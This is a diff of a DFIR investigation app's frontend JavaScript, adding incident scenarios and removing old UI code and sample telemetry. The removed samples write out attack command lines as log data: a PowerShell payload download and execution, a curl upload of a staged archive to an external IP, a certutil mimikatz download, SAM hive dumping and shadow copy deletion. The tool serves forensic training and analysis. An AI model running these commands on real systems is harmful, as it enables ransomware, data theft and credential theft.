@@ -1,2326 +1,1810 @@
 /**
- * A1 DFIR Investigator - ChatGPT Style Frontend Logic
+ * A1 DFIR investigator — workbench controller.
+ *
+ * One case column and an on-demand evidence drawer. The drawer's map is an
+ * entity tree (evidence-tree.js) built from TelemetryGraph; events and the
+ * report sit beside it. Everything shown comes from /api/*.
  */
-
 (function () {
   "use strict";
-  console.log("%c[A1 DFIR] Modern Thinking Stream Loaded v3.2", "color:#818cf8;font-weight:bold;font-size:12px;");
 
-  // Application State
-  const state = {
-    activeProvider: "ollama",
-    activeModel: "gemma4:31b",
-    currentDb: "",
-    databases: [],
-    models: {
-      ollama: [
-        "gemma4:31b",
-        "llama3.1",
-        "llama3.3",
-        "mistral-large-3:675b",
-        "deepseek-v4-pro:0813",
-        "deepseek-r1",
-        "nemotron-3-nano:30b",
-        "glm-5.3-flash",
-      ],
-      openai: [
-        "gpt-4o",
-        "gpt-4o-mini",
-        "o1-mini",
-        "o3-mini",
-        "gpt-4-turbo",
-      ],
+  var HISTORY_KEY = "a1_case_log_v2";
+  var DRAWER_KEY = "a1_drawer_w";
+  var DRAWER_MIN = 380;
+  var DRAWER_MAX = 900;
+  var MAX_HISTORY = 25;
+
+  var STEPS = [
+    ["prep", "prepare"],
+    ["plan", "plan"],
+    ["collect", "collect"],
+    ["pack", "pack"],
+    ["verdict", "verdict"],
+  ];
+
+  var SCENARIOS = [
+    {
+      db: "attack_lateral_movement.db", code: "ATK-A", host: "WS-OPS-01", category: "attack",
+      title: "LSASS access, SMB recon, remote service install",
+      query: "Investigate suspicious activity on WS-OPS-01: a process accessed lsass.exe memory and a dump file appeared in a user Temp directory, the same session then opened SMB connections to SRV-FILE-01, and repeated failed network logons for one account were followed by a successful one and a new Windows service installation. Determine whether this is credential dumping and lateral movement or benign administrative activity.",
     },
-    isGenerating: false,
-    activeAbortController: null,
+    {
+      db: "attack_lateral_movement.db", code: "INC-A", host: "SRV-FILE-01", category: "ambiguous",
+      title: "Unauthorized execution alert with missing telemetry",
+      query: "Investigate an alert claiming unauthorized execution on SRV-FILE-01. Examine telemetry for the parent process, network flows, and authentication. If essential telemetry is absent to prove or disprove malicious activity, render an inconclusive outcome citing the specific missing telemetry.",
+    },
+    {
+      db: "attack_data_exfiltration.db", code: "ATK-B", host: "WS-DEV-02", category: "attack",
+      title: "PowerShell archiving, scheduled task, outbound HTTPS",
+      query: "Investigate suspicious activity on WS-DEV-02: PowerShell spawned an archiver that staged the user's spreadsheets into a password-protected archive in Temp, then dropped a script and created a logon scheduled task, made repeated outbound HTTPS connections to an external address, and the archive was later deleted. Determine whether this is data exfiltration or benign software activity.",
+    },
+    {
+      db: "ransomware_attack_complete_ecs.db", code: "ATK-C", host: "WS-ACCT-01", category: "attack",
+      title: "Word document, vssadmin shadow copy deletion, LockBit",
+      query: "Investigate suspicious ransomware activity on WS-ACCT-01: Microsoft Word opened invoice_2026-Q3.docx, hidden PowerShell invoked vssadmin.exe to delete shadow copies, and LockBit executed encrypting user documents with .locked extensions. Determine whether this is ransomware or benign activity.",
+    },
+    {
+      db: "attack_lotl_fileless.db", code: "ATK-D", host: "WS-EXEC-02", category: "attack",
+      title: "mshta encoded PowerShell, discovery, certutil staging, WMI",
+      query: "Investigate suspicious Living-off-the-Land and fileless execution on WS-EXEC-02: mshta.exe spawned hidden encoded PowerShell establishing outbound C2, discovery LOLBins executed, certutil staged payloads, and remote WMI execution occurred against DC-AUTH-01. Determine whether this is a fileless intrusion or benign administrative activity.",
+    },
+    {
+      db: "attack_lotl_fileless.db", code: "AMB-A", host: "WS-EXEC-02", category: "ambiguous",
+      title: "certutil and flagged PowerShell during business hours",
+      query: "Investigate command-line and utility activity on WS-EXEC-02: certutil.exe and PowerShell with flags were invoked during business hours. Evaluate whether this represents malicious C2 staging, dual-use developer activity, or benign administration, noting any ambiguity in intent.",
+    },
+    {
+      db: "wazuh_lotl_attack_dataset.db", code: "ATK-E", host: "WS-DEV-01", category: "attack",
+      title: "LOL PowerShell, SAM hive access, C2 beaconing",
+      query: "Investigate suspicious Living-off-the-Land PowerShell execution and SAM registry access on WS-DEV-01 on 2026-10-15. Trace discovery commands, persistence tasks, and C2 exfiltration in Wazuh telemetry.",
+    },
+    {
+      db: "suricata_c2_intrusion.db", code: "ATK-F", host: "WS-FINANCE-01", category: "attack",
+      title: "CobaltStrike C2 beaconing to 203.0.113.88:8443",
+      query: "Investigate critical Suricata NIDS alerts on WS-FINANCE-01:multiple ET MALWARE CobaltStrike C2 beaconing alerts to 203.0.113.88:8443 between 2026-10-16T14:00:00Z and 2026-10-16T16:02:00Z",
+    },
+    {
+      db: "attack_supply_chain.db", code: "ATK-G", host: "WS-DEV-07", category: "attack",
+      title: "CorpTools update, rogue local admin, Kerberos tickets",
+      query: "Investigate a potential supply chain compromise on WS-DEV-07: the CorpTools application auto-updated and shortly after, discovery commands were executed, a new local administrator account appeared, Kerberos ticket requests targeted SQL service accounts, and WinRM sessions were established to WS-DBA-03 and DC-CORP-01. Determine whether this is a supply chain attack or legitimate software activity.",
+    },
+    {
+      db: "benign_admin_activity.db", code: "BEN-A", host: "WS-ADMIN-05", category: "benign",
+      title: "Backup verification script, SMB, W32Time check",
+      query: "Investigate scheduled activity on WS-ADMIN-05: svchost.exe spawned PowerShell running backup_verification.ps1 under CORP\\sysadmin, which opened SMB connections to SRV-FILE-02, wrote to backup_audit_20260915.log, and checked W32Time registry settings. Determine whether this is an attack or benign administrative activity.",
+    },
+  ];
+
+  var state = {
+    provider: "",
+    model: "",
+    dbPath: "",
+    databases: [],
+    events: [],
+    eventTotal: 0,
+    graphData: { nodes: [], edges: [], meta: {} },
+    nodeById: new Map(),
+    hiddenTypes: new Set(),
+    selectedId: null,
+    scopeEventIds: null,
+    models: { opencode: [], ollama: [], openai: [] },
+    modelTab: "opencode",
+    generating: false,
+    abort: null,
+    cancelled: false,
+    sessionId: null,
+    lastSessionId: null,
+    currentQuery: "",
     history: [],
-    currentSessionId: null,
+    drawerOpen: false,
+    activeView: "graph",
+    mapView: "tree",
+    report: { md: "", verdict: "", at: "" },
+    tableRows: [],
   };
 
-  // DOM Elements
-  const elements = {
-    themeToggleBtn: document.getElementById("themeToggleBtn"),
-    sidebar: document.getElementById("sidebar"),
-    sidebarCollapseBtn: document.getElementById("sidebarCollapseBtn"),
-    sidebarToggleBtn: document.getElementById("sidebarToggleBtn"),
-    sidebarViewTableBtn: document.getElementById("sidebarViewTableBtn"),
-    newChatBtn: document.getElementById("newChatBtn"),
-    clearChatBtn: document.getElementById("clearChatBtn"),
-    clearHistoryBtn: document.getElementById("clearHistoryBtn"),
-    historyList: document.getElementById("historyList"),
-    dbSelect: document.getElementById("dbSelect"),
-    headerDbName: document.getElementById("headerDbName"),
-    headerDbPill: document.getElementById("headerDbPill"),
-    headerTableBtn: document.getElementById("headerTableBtn"),
-    headerTableBadge: document.getElementById("headerTableBadge"),
-    // Global Table Dialog
-    globalTableDialog: document.getElementById("globalTableDialog"),
-    globalDialogCloseBtn: document.getElementById("globalDialogCloseBtn"),
-    globalDialogCopyBtn: document.getElementById("globalDialogCopyBtn"),
-    globalDialogSearchInput: document.getElementById("globalDialogSearchInput"),
-    globalDialogCountBadge: document.getElementById("globalDialogCountBadge"),
-    globalDialogTableWrap: document.getElementById("globalDialogTableWrap"),
-    globalDialogTitle: document.getElementById("globalDialogTitle"),
-    globalDialogMeta: document.getElementById("globalDialogMeta"),
-    // Model Selector Dropdown Elements
-    modelDropdownContainer: document.getElementById("modelDropdownContainer"),
-    modelSelectorPill: document.getElementById("modelSelectorPill"),
-    modelMenu: document.getElementById("modelMenu"),
-    activeModelName: document.getElementById("activeModelName"),
-    activeProviderBadge: document.getElementById("activeProviderBadge"),
-    tabOllama: document.getElementById("tabOllama"),
-    tabOpenai: document.getElementById("tabOpenai"),
-    modelSearchInput: document.getElementById("modelSearchInput"),
-    modelList: document.getElementById("modelList"),
-    customModelInput: document.getElementById("customModelInput"),
-    applyCustomModelBtn: document.getElementById("applyCustomModelBtn"),
-    // Chat Stage & Input
-    chatStage: document.getElementById("chatStage"),
-    welcomeScreen: document.getElementById("welcomeScreen"),
-    messagesContainer: document.getElementById("messagesContainer"),
-    promptInput: document.getElementById("promptInput"),
-    sendBtn: document.getElementById("sendBtn"),
-    inputMetaModel: document.getElementById("inputMetaModel"),
-    inputMetaDb: document.getElementById("inputMetaDb"),
-    systemStatusDot: document.getElementById("systemStatusDot"),
-    systemStatusText: document.getElementById("systemStatusText"),
-    // Workbench View Modes
-    tabViewGraph: document.getElementById("tabViewGraph"),
-    tabViewChat: document.getElementById("tabViewChat"),
-    tabViewReport: document.getElementById("tabViewReport"),
-    graphStage: document.getElementById("graphStage"),
-    reportStage: document.getElementById("reportStage"),
-    graphNodeCountBadge: document.getElementById("graphNodeCountBadge"),
-    graphLiveStatus: document.getElementById("graphLiveStatus"),
-    // Graph Controls
-    graphCanvasContainer: document.getElementById("graphCanvasContainer"),
-    graphSearchInput: document.getElementById("graphSearchInput"),
-    graphExpandAllBtn: document.getElementById("graphExpandAllBtn"),
-    graphCollapseAllBtn: document.getElementById("graphCollapseAllBtn"),
-    graphZoomInBtn: document.getElementById("graphZoomInBtn"),
-    graphZoomOutBtn: document.getElementById("graphZoomOutBtn"),
-    graphFitBtn: document.getElementById("graphFitBtn"),
-    scenarioDropdownBtn: document.getElementById("scenarioDropdownBtn"),
-    scenarioMenu: document.getElementById("scenarioMenu"),
-    // Inspector Drawer
-    graphInspectorDrawer: document.getElementById("graphInspectorDrawer"),
-    inspectorCloseBtn: document.getElementById("inspectorCloseBtn"),
-    inspectorTypeBadge: document.getElementById("inspectorTypeBadge"),
-    inspectorThreatBadge: document.getElementById("inspectorThreatBadge"),
-    inspectorTitle: document.getElementById("inspectorTitle"),
-    inspectorSubtitle: document.getElementById("inspectorSubtitle"),
-    inspectorBody: document.getElementById("inspectorBody"),
-    // Report Stage Elements
-    reportStageVerdict: document.getElementById("reportStageVerdict"),
-    reportStageVerdictTag: document.getElementById("reportStageVerdictTag"),
-    reportStageVerdictTime: document.getElementById("reportStageVerdictTime"),
-    reportStageContent: document.getElementById("reportStageContent"),
-    reportStageCopyBtn: document.getElementById("reportStageCopyBtn"),
-  };
-
-  let activeEvidenceHandler = null;
-  let latestEvidenceTimeline = null;
-  let forensicGraph = null;
-  let currentActiveView = "chat";
-
-  // Pre-configured High-Fidelity Forensic Scenarios for Instant Graph Exploration
-  const SAMPLE_SCENARIOS = {
-    ransomware: [
-      {
-        timestamp: "2026-09-20T10:05:12Z",
-        host_id: "WS-ACCT-01",
-        action: "process_started",
-        process_name: "winword.exe",
-        process_entity_id: "3104",
-        parent_process_name: "explorer.exe",
-        parent_process_entity_id: "1050",
-        command_line: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\alice\\Downloads\\invoice_2026-Q3.docx"',
-        summary: "User opened phishing macro invoice_2026-Q3.docx in Word"
-      },
-      {
-        timestamp: "2026-09-20T10:10:05Z",
-        host_id: "WS-ACCT-01",
-        action: "process_started",
-        process_name: "powershell.exe",
-        process_entity_id: "4820",
-        parent_process_name: "winword.exe",
-        parent_process_entity_id: "3104",
-        command_line: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://198.51.100.77:8080/lockbit.exe -OutFile C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe; Start-Process C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe"',
-        summary: "Word spawned hidden PowerShell downloading second-stage payload"
-      },
-      {
-        timestamp: "2026-09-20T10:10:08Z",
-        host_id: "WS-ACCT-01",
-        action: "network_connection",
-        process_name: "powershell.exe",
-        process_entity_id: "4820",
-        destination_ip: "198.51.100.77",
-        destination_port: "8080",
-        network_direction: "Outbound",
-        summary: "Outbound C2 payload fetch to 198.51.100.77:8080"
-      },
-      {
-        timestamp: "2026-09-20T10:15:30Z",
-        host_id: "WS-ACCT-01",
-        action: "process_started",
-        process_name: "vssadmin.exe",
-        process_entity_id: "5112",
-        parent_process_name: "powershell.exe",
-        parent_process_entity_id: "4820",
-        command_line: "vssadmin.exe delete shadows /all /quiet",
-        summary: "Shadow copy deletion to inhibit system recovery"
-      },
-      {
-        timestamp: "2026-09-20T10:16:00Z",
-        host_id: "WS-ACCT-01",
-        action: "process_started",
-        process_name: "lockbit.exe",
-        process_entity_id: "4700",
-        parent_process_name: "powershell.exe",
-        parent_process_entity_id: "4820",
-        command_line: "C:\\Users\\alice\\AppData\\Local\\Temp\\lockbit.exe",
-        summary: "LockBit ransomware encryptor execution"
-      },
-      {
-        timestamp: "2026-09-20T10:17:15Z",
-        host_id: "WS-ACCT-01",
-        action: "file_created",
-        process_name: "lockbit.exe",
-        process_entity_id: "4700",
-        file_name: "Q3_Financial_Statement.xlsx.locked",
-        file_path: "C:\\Users\\alice\\Documents\\Q3_Financial_Statement.xlsx.locked",
-        summary: "Encrypted document created with .locked extension"
-      },
-      {
-        timestamp: "2026-09-20T10:17:18Z",
-        host_id: "WS-ACCT-01",
-        action: "file_created",
-        process_name: "lockbit.exe",
-        process_entity_id: "4700",
-        file_name: "Payroll_2026.docx.locked",
-        file_path: "C:\\Users\\alice\\Documents\\Payroll_2026.docx.locked",
-        summary: "Encrypted document created with .locked extension"
-      },
-      {
-        timestamp: "2026-09-20T10:18:00Z",
-        host_id: "WS-ACCT-01",
-        action: "registry_created",
-        process_name: "lockbit.exe",
-        process_entity_id: "4700",
-        registry_key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\LockBitRansom",
-        summary: "Ransom note persistence registry key created"
-      }
-    ],
-    exfil: [
-      {
-        timestamp: "2026-09-11T14:02:10Z",
-        host_id: "WS-DEV-02",
-        action: "process_started",
-        process_name: "explorer.exe",
-        process_entity_id: "1200",
-        summary: "User desktop shell active"
-      },
-      {
-        timestamp: "2026-09-11T14:15:22Z",
-        host_id: "WS-DEV-02",
-        action: "process_started",
-        process_name: "powershell.exe",
-        process_entity_id: "2450",
-        parent_process_name: "explorer.exe",
-        parent_process_entity_id: "1200",
-        command_line: "powershell.exe -ExecutionPolicy Bypass",
-        summary: "Interactive PowerShell console launched"
-      },
-      {
-        timestamp: "2026-09-11T14:18:05Z",
-        host_id: "WS-DEV-02",
-        action: "process_started",
-        process_name: "7z.exe",
-        process_entity_id: "2980",
-        parent_process_name: "powershell.exe",
-        parent_process_entity_id: "2450",
-        command_line: '7z.exe a -pSecureP@ss2026 C:\\Windows\\Temp\\dev_archive.7z C:\\Users\\dev\\source\\*',
-        summary: "Archive staging of source code to temporary directory"
-      },
-      {
-        timestamp: "2026-09-11T14:18:30Z",
-        host_id: "WS-DEV-02",
-        action: "file_created",
-        process_name: "7z.exe",
-        process_entity_id: "2980",
-        file_name: "dev_archive.7z",
-        file_path: "C:\\Windows\\Temp\\dev_archive.7z",
-        summary: "Encrypted 7-Zip staging archive created"
-      },
-      {
-        timestamp: "2026-09-11T14:22:15Z",
-        host_id: "WS-DEV-02",
-        action: "process_started",
-        process_name: "curl.exe",
-        process_entity_id: "3110",
-        parent_process_name: "powershell.exe",
-        parent_process_entity_id: "2450",
-        command_line: "curl.exe -F file=@C:\\Windows\\Temp\\dev_archive.7z https://203.0.113.88/upload",
-        summary: "Outbound exfiltration POST request via curl"
-      },
-      {
-        timestamp: "2026-09-11T14:22:16Z",
-        host_id: "WS-DEV-02",
-        action: "network_connection",
-        process_name: "curl.exe",
-        process_entity_id: "3110",
-        destination_ip: "203.0.113.88",
-        destination_port: "443",
-        network_direction: "Outbound",
-        summary: "Exfiltration network connection to external endpoint"
-      },
-      {
-        timestamp: "2026-09-11T14:25:00Z",
-        host_id: "WS-DEV-02",
-        action: "file_deleted",
-        process_name: "powershell.exe",
-        process_entity_id: "2450",
-        file_name: "dev_archive.7z",
-        file_path: "C:\\Windows\\Temp\\dev_archive.7z",
-        summary: "Staging archive deleted to destroy evidence"
-      }
-    ],
-    lateral: [
-      {
-        timestamp: "2026-09-10T09:30:00Z",
-        host_id: "WS-OPS-01",
-        action: "process_started",
-        process_name: "wsmprovhost.exe",
-        process_entity_id: "1840",
-        summary: "WinRM host provider worker initialized on WS-OPS-01"
-      },
-      {
-        timestamp: "2026-09-10T09:31:12Z",
-        host_id: "WS-OPS-01",
-        action: "process_started",
-        process_name: "powershell.exe",
-        process_entity_id: "2100",
-        parent_process_name: "wsmprovhost.exe",
-        parent_process_entity_id: "1840",
-        command_line: "powershell.exe -Enc cwBjAC4AZQB4AGUA...",
-        summary: "Remote PowerShell spawned under WinRM"
-      },
-      {
-        timestamp: "2026-09-10T09:33:45Z",
-        host_id: "WS-OPS-01",
-        action: "process_started",
-        process_name: "certutil.exe",
-        process_entity_id: "2600",
-        parent_process_name: "powershell.exe",
-        parent_process_entity_id: "2100",
-        command_line: "certutil.exe -urlcache -split -f http://198.51.100.77/tools/mimikatz.exe C:\\Windows\\Temp\\m.exe",
-        summary: "LOLBin certutil downloaded tool binary"
-      },
-      {
-        timestamp: "2026-09-10T09:34:00Z",
-        host_id: "WS-OPS-01",
-        action: "network_connection",
-        process_name: "certutil.exe",
-        process_entity_id: "2600",
-        destination_ip: "198.51.100.77",
-        destination_port: "80",
-        network_direction: "Outbound",
-        summary: "HTTP download connection to 198.51.100.77"
-      },
-      {
-        timestamp: "2026-09-10T09:40:10Z",
-        host_id: "DC-AUTH-01",
-        action: "process_started",
-        process_name: "wmiprvse.exe",
-        process_entity_id: "880",
-        summary: "WMI service provider process triggered on Domain Controller"
-      },
-      {
-        timestamp: "2026-09-10T09:41:00Z",
-        host_id: "DC-AUTH-01",
-        action: "process_started",
-        process_name: "cmd.exe",
-        process_entity_id: "920",
-        parent_process_name: "wmiprvse.exe",
-        parent_process_entity_id: "880",
-        command_line: "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
-        summary: "Remote command execution dumping SAM registry hive on DC"
-      },
-      {
-        timestamp: "2026-09-10T09:41:15Z",
-        host_id: "DC-AUTH-01",
-        action: "file_created",
-        process_name: "cmd.exe",
-        process_entity_id: "920",
-        file_name: "sam.save",
-        file_path: "C:\\Windows\\Temp\\sam.save",
-        summary: "SAM hive backup file created"
-      }
-    ]
-  };
-
-  function switchView(viewName) {
-    currentActiveView = viewName;
-    const views = [
-      { name: "graph", tab: elements.tabViewGraph, stage: elements.graphStage },
-      { name: "chat", tab: elements.tabViewChat, stage: elements.chatStage },
-      { name: "report", tab: elements.tabViewReport, stage: elements.reportStage },
-    ];
-
-    views.forEach((v) => {
-      const isActive = v.name === viewName;
-      if (v.tab) {
-        v.tab.classList.toggle("active", isActive);
-        v.tab.setAttribute("aria-selected", isActive ? "true" : "false");
-      }
-      if (v.stage) {
-        v.stage.style.display = isActive ? "flex" : "none";
-      }
-    });
-
-    if (viewName === "graph" && forensicGraph) {
-      setTimeout(() => forensicGraph.fitToScreen(), 50);
-    }
+  var els = {};
+  function $(id) {
+    return document.getElementById(id);
   }
 
-  function initForensicGraph() {
-    if (!elements.graphCanvasContainer || !window.ForensicGraph) return;
-    forensicGraph = new window.ForensicGraph(elements.graphCanvasContainer, {
-      onNodeSelect: (node) => openEntityInspector(node),
-      onNodeDeselect: () => closeEntityInspector(),
-      onExpansionChange: () => {
-        if (forensicGraph) {
-          const vis = forensicGraph.getVisibleCount();
-          const total = forensicGraph.nodes.size;
-          if (elements.graphNodeCountBadge) elements.graphNodeCountBadge.textContent = `${vis}`;
-          if (elements.graphLiveStatus) elements.graphLiveStatus.textContent = `${vis} of ${total} nodes visible`;
-          // Refresh inspector if open
-          if (forensicGraph.selectedNodeId) {
-            const selNode = forensicGraph.nodes.get(forensicGraph.selectedNodeId);
-            if (selNode) openEntityInspector(selNode);
-          }
-        }
-      },
-    });
-  }
+  // ---------------------------------------------------------------- utilities
 
-  function loadTimelineIntoGraph(timelineEvents) {
-    if (!forensicGraph) initForensicGraph();
-    if (!forensicGraph) return;
-    forensicGraph.loadTimeline(timelineEvents);
-    const vis = forensicGraph.getVisibleCount ? forensicGraph.getVisibleCount() : forensicGraph.nodes.size;
-    const total = forensicGraph.nodes.size;
-    if (elements.graphNodeCountBadge) {
-      elements.graphNodeCountBadge.textContent = `${vis}`;
-    }
-    if (elements.graphLiveStatus) {
-      elements.graphLiveStatus.textContent = `${vis} of ${total} nodes visible`;
-    }
-  }
-
-  function openEntityInspector(node) {
-    if (!elements.graphInspectorDrawer) return;
-
-    elements.inspectorTypeBadge.textContent = node.type.toUpperCase();
-    elements.inspectorTypeBadge.className = `inspector-type-badge ${node.type}`;
-    elements.inspectorTitle.textContent = node.name || "Entity";
-    elements.inspectorSubtitle.textContent = node.pid ? `PID ${node.pid} · Host ${node.host}` : `Host ${node.host}`;
-
-    if (node.isSuspicious) {
-      elements.inspectorThreatBadge.style.display = "inline-flex";
-    } else {
-      elements.inspectorThreatBadge.style.display = "none";
-    }
-
-    elements.inspectorBody.innerHTML = "";
-
-    // Action button to Expand / Collapse Connected Nodes if node has children
-    if (node.children && node.children.length > 0 && forensicGraph) {
-      const isExpanded = forensicGraph.expandedNodeIds.has(node.id);
-      const expandBtn = document.createElement("button");
-      expandBtn.type = "button";
-      expandBtn.className = "inspector-expand-btn";
-      expandBtn.innerHTML = `
-        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
-          ${isExpanded 
-            ? '<line x1="5" y1="12" x2="19" y2="12"></line>' 
-            : '<line x1="12" y1="5" x2="12" y2="19"></line><line x1="5" y1="12" x2="19" y2="12"></line>'}
-        </svg>
-        <span>${isExpanded ? `Collapse Connected Nodes (${node.children.length})` : `Expand Connected Nodes (${node.children.length})`}</span>
-      `;
-      expandBtn.onclick = () => {
-        forensicGraph.toggleNodeExpansion(node.id);
-      };
-      elements.inspectorBody.appendChild(expandBtn);
-    }
-
-    // Command Line block if process
-    if (node.cmdLine) {
-      const cmdSec = document.createElement("div");
-      cmdSec.className = "inspector-section";
-      cmdSec.innerHTML = `
-        <div class="inspector-section-label">Command Line / Execution</div>
-        <div class="inspector-cmd-wrap">
-          <div class="inspector-cmd">${escapeHtml(node.cmdLine)}</div>
-          <button type="button" class="action-pill-btn-sm inspector-cmd-copy">
-            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
-            <span>Copy Command</span>
-          </button>
-        </div>
-      `;
-      cmdSec.querySelector(".inspector-cmd-copy").onclick = () => {
-        navigator.clipboard.writeText(node.cmdLine);
-        const span = cmdSec.querySelector(".inspector-cmd-copy span");
-        span.textContent = "Copied!";
-        setTimeout(() => (span.textContent = "Copy Command"), 1800);
-      };
-      elements.inspectorBody.appendChild(cmdSec);
-    }
-
-    // Connected Graph Lineage Section (Parents & Children chips)
-    if (forensicGraph && ((node.children && node.children.length > 0) || (node.parents && node.parents.length > 0))) {
-      const connSec = document.createElement("div");
-      connSec.className = "inspector-section";
-      connSec.innerHTML = `<div class="inspector-section-label">Connected Graph Lineage</div><div class="inspector-chips-list"></div>`;
-      const chipsList = connSec.querySelector(".inspector-chips-list");
-
-      // Parents
-      if (node.parents && node.parents.length > 0) {
-        node.parents.forEach((parentId) => {
-          const parentNode = forensicGraph.nodes.get(parentId);
-          if (!parentNode) return;
-          const chip = document.createElement("button");
-          chip.type = "button";
-          chip.className = "inspector-entity-chip";
-          chip.innerHTML = `
-            <span class="inspector-chip-name">↑ ${escapeHtml(parentNode.name)}</span>
-            <span class="inspector-chip-meta">Parent ${parentNode.type}</span>
-          `;
-          chip.onclick = () => {
-            forensicGraph.selectNode(parentNode.id);
-          };
-          chipsList.appendChild(chip);
-        });
-      }
-
-      // Children
-      if (node.children && node.children.length > 0) {
-        node.children.forEach((childId) => {
-          const childNode = forensicGraph.nodes.get(childId);
-          if (!childNode) return;
-          const chip = document.createElement("button");
-          chip.type = "button";
-          chip.className = "inspector-entity-chip";
-          chip.innerHTML = `
-            <span class="inspector-chip-name">↳ ${escapeHtml(childNode.name)}</span>
-            <span class="inspector-chip-meta">${childNode.type}</span>
-          `;
-          chip.onclick = () => {
-            if (!forensicGraph.expandedNodeIds.has(node.id)) {
-              forensicGraph.toggleNodeExpansion(node.id, true);
-            }
-            forensicGraph.selectNode(childNode.id);
-          };
-          chipsList.appendChild(chip);
-        });
-      }
-
-      elements.inspectorBody.appendChild(connSec);
-    }
-
-    // Key-value Attributes
-    const kvSec = document.createElement("div");
-    kvSec.className = "inspector-section";
-    const kvGrid = document.createElement("div");
-    kvGrid.className = "inspector-kv-grid";
-
-    const rows = [
-      ["Type", node.type],
-      ["Host", node.host],
-      ["Timestamp", node.timestamp || "N/A"],
-      ["Action", node.action || "N/A"],
-    ];
-
-    if (node.type === "process") {
-      rows.push(["PID", node.pid]);
-      if (node.parentName) rows.push(["Parent Proc", `${node.parentName} (${node.parentId || '?'})`]);
-      if (node.childrenCount !== undefined) rows.push(["Children Spawned", `${node.childrenCount}`]);
-    } else if (node.type === "network") {
-      rows.push(["IP Address", node.ip]);
-      rows.push(["Port", node.port || "N/A"]);
-      rows.push(["Direction", node.direction]);
-    } else if (node.type === "file") {
-      rows.push(["File Action", node.fileAction]);
-      rows.push(["File Path", node.fullPath]);
-    } else if (node.type === "registry") {
-      rows.push(["Key Path", node.fullPath]);
-    }
-
-    rows.forEach(([k, v]) => {
-      const kEl = document.createElement("div");
-      kEl.className = "inspector-k";
-      kEl.textContent = k;
-      const vEl = document.createElement("div");
-      vEl.className = "inspector-v";
-      vEl.textContent = v;
-      kvGrid.appendChild(kEl);
-      kvGrid.appendChild(vEl);
-    });
-
-    kvSec.appendChild(kvGrid);
-    elements.inspectorBody.appendChild(kvSec);
-
-    elements.graphInspectorDrawer.classList.add("open");
-  }
-
-  function closeEntityInspector() {
-    if (elements.graphInspectorDrawer) {
-      elements.graphInspectorDrawer.classList.remove("open");
-    }
-  }
-
-  // -------------------------------------------------------------------------
-  // Initialization
-  // -------------------------------------------------------------------------
-  async function init() {
-    loadTheme();
-    loadSavedHistory();
-    loadSidebarState();
-    initForensicGraph();
-    setupEventListeners();
-    await fetchInitialStatus();
-    await fetchModels();
-    preloadEventCount();
-  }
-
-  // -------------------------------------------------------------------------
-  // Theme Handling
-  // -------------------------------------------------------------------------
-  function loadTheme() {
-    const savedTheme = localStorage.getItem("a1_theme") || "dark";
-    if (savedTheme === "dark") {
-      document.body.classList.add("theme-dark");
-    } else {
-      document.body.classList.remove("theme-dark");
-    }
-  }
-
-  function toggleTheme() {
-    const isDark = document.body.classList.toggle("theme-dark");
-    localStorage.setItem("a1_theme", isDark ? "dark" : "light");
-  }
-
-  // -------------------------------------------------------------------------
-  // Sidebar State & Keyboard Shortcuts
-  // -------------------------------------------------------------------------
-  function loadSidebarState() {
-    const saved = localStorage.getItem("a1_sidebar_collapsed") === "true";
-    if (saved && elements.sidebar) {
-      elements.sidebar.classList.add("collapsed");
-      if (elements.sidebarToggleBtn) {
-        elements.sidebarToggleBtn.title = "Open Sidebar (Ctrl+B)";
-        elements.sidebarToggleBtn.setAttribute("aria-label", "Open Sidebar");
-      }
-    }
-  }
-
-  function toggleSidebar(forceState) {
-    if (!elements.sidebar) return;
-    const isCollapsed = forceState !== undefined ? !forceState : !elements.sidebar.classList.contains("collapsed");
-    if (isCollapsed) {
-      elements.sidebar.classList.add("collapsed");
-      if (elements.sidebarToggleBtn) {
-        elements.sidebarToggleBtn.title = "Open Sidebar (Ctrl+B)";
-        elements.sidebarToggleBtn.setAttribute("aria-label", "Open Sidebar");
-      }
-    } else {
-      elements.sidebar.classList.remove("collapsed");
-      if (elements.sidebarToggleBtn) {
-        elements.sidebarToggleBtn.title = "Collapse Sidebar (Ctrl+B)";
-        elements.sidebarToggleBtn.setAttribute("aria-label", "Collapse Sidebar");
-      }
-    }
-    try {
-      localStorage.setItem("a1_sidebar_collapsed", isCollapsed ? "true" : "false");
-    } catch (e) { }
-  }
-
-  // -------------------------------------------------------------------------
-  // Shared Telemetry Table Renderer & Global Dialog
-  // -------------------------------------------------------------------------
-  let globalTelemetryCache = null;
-
-  function formatActionBadge(action) {
-    const a = (action || "unknown").toLowerCase();
-    let badgeClass = "action-badge-default";
-    if (a.includes("proc")) badgeClass = "action-badge-process";
-    else if (a.includes("net")) badgeClass = "action-badge-network";
-    else if (a.includes("file")) badgeClass = "action-badge-file";
-    else if (a.includes("reg")) badgeClass = "action-badge-registry";
-    return `<span class="action-badge ${badgeClass}">${escapeHtml(action || "unknown")}</span>`;
-  }
-
-  function setupTable(container, events, searchInput, countBadge, copyBtn) {
-    if (!container) return;
-    container.replaceChildren();
-
-    if (!events || events.length === 0) {
-      const empty = document.createElement("div");
-      empty.className = "history-empty";
-      empty.textContent = "No telemetry events to display";
-      container.appendChild(empty);
-      if (countBadge) countBadge.textContent = "0 events";
-      return;
-    }
-
-    const table = document.createElement("table");
-    table.className = "evidence-table";
-    table.setAttribute("aria-label", "Telemetry events table");
-    const caption = table.createCaption();
-    caption.className = "sr-only";
-    caption.textContent = "Telemetry events table";
-    const columns = ["Time", "Event ID", "Host", "Action", "Process", "Summary"];
-    const headerRow = table.createTHead().insertRow();
-    columns.forEach((column) => {
-      const header = document.createElement("th");
-      header.scope = "col";
-      header.textContent = column;
-      headerRow.appendChild(header);
-    });
-
-    const tableBody = table.createTBody();
-    const rowEntries = [];
-
-    events.forEach((event) => {
-      const details = event.details && typeof event.details === "object" ? event.details : {};
-      const processName = event.process_name || details.name || details.process_name || "";
